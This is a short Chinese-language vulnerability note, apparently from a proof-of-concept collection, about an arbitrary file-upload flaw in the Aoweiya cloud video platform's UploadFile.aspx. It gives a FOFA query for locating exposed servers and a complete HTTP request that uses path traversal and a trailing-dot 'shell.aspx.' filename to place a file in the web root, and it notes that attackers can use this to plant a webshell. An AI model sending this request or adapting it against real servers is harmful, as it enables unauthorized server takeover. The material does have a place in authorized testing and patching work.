# 奥威亚云视频平台UploadFile.aspx存在文件上传漏洞

奥威亚云视频平台UploadFile.aspx存在文件上传漏洞，攻击者可上传webshell获取服务器权限。

## fofa

```yaml
body="/Upload/DomainInfo/MaxAVALogo.png"
```

## poc

```java
POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----sajhdjqwjejqwbejhqwbjebqwhje

------sajhdjqwjejqwbejhqwbjebqwhje
Content-Disposition: form-data; name="file"; filename="shell.aspx."
Content-Type: image/jpeg

1111
------sajhdjqwjejqwbejhqwbjebqwhje-
```

文件路径`http://ip/shell.aspx`



## 漏洞来源

- https://mp.weixin.qq.com/s/Kxmw41l8TK5jnaj63lyG0A